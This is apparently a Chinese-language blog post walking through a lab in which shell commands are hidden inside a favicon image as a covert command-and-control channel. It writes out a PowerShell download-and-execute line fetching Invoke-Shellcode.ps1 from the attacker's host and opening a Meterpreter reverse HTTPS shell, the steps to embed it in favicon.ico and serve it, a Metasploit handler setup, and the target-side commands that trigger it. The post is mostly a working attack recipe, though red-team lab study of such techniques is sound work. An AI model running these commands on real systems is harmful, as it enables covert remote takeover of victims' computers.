---
title: command-and-control-images
layout: post
tags:
  - sec
  - hack
  - tools
  - bin
  - powershell
category: 
  - hack
  - sec
  - bin
  - c2
  - image
  - powershell
comments: true
share: true
description: 使用[脚本](http://rwnin.net/?p=35)将命令转化为图标，然后使用powershell执行
---

* TOC
{:toc}

使用[脚本](http://rwnin.net/?p=35)将命令转化为图标，然后使用powershell执行

<!--more-->

实验环境：

- kali(IP:192.168.222.140)
- win7


## 制作具有PS命令的txt文本

在kali机器下，制作具有PS命令的txt文本：

```bash
echo 'IEX((new-object net.webclient).downloadstring("http://192.168.222.140/Invoke-Shellcode.ps1"));Invoke-Shellcode -payload windows/meterpreter/reverse_https -LHOST 192.168.222.140 -LPORT 443 -force' > shellcode.txt
```

![Alt text](/img/tools/c2ico/1515077380044.png)

## 创作恶意图标

使用[create_favicon.py](https://github.com/et0x/C2)制作具有恶意命令的图片，改为ico文件，并将[Invoke-Shellcode.ps1](https://github.com/EmpireProject/Empire/blame/master/data/module_source/code_execution/Invoke-Shellcode.ps1)传到Web目录,：

```bash
root@kali:~/Desktop/C2-master# python create_favicon.py shellcode.txt evil.png

root@kali:~/Desktop/C2-master# mv evil.png /var/www/html/favicon.ico
 
root@kali:~/Desktop/C2-master# service apache2 start
```

![Alt text](/img/tools/c2ico/1515077486579.png)

## MSF监听

使用msf，根据`shellcode.txt`里的反向meterpreter进行反向监听：

```bash
msf > use exploit/multi/handler 

msf exploit(handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https

msf exploit(handler) > set LPORT 443
LPORT => 443

msf exploit(handler) > set LHOST 192.168.222.140
LHOST => 192.168.222.140
```

## 执行PS命令

在靶机win7上添加`readFavicon.ps1`模块，然后下载执行图标里的shellcode：

```bash
PS C:\Users\b404\Desktop> Import-Module .\readFavicon.ps1

PS C:\Users\b404\Desktop> Get-FaviconText -URL http://192.168.222.140/favicon.ic
o -WriteTo $env:TEMP
```

![Alt text](/img/tools/c2ico/1515077663343.png)


MSF返回Meterpreter：


![Alt text](/img/tools/c2ico/1515077774746.png)

## Refer

- [Command and Control – Images](https://pentestlab.blog/2018/01/02/command-and-control-images/amp/):https://pentestlab.blog/2018/01/02/command-and-control-images/amp/
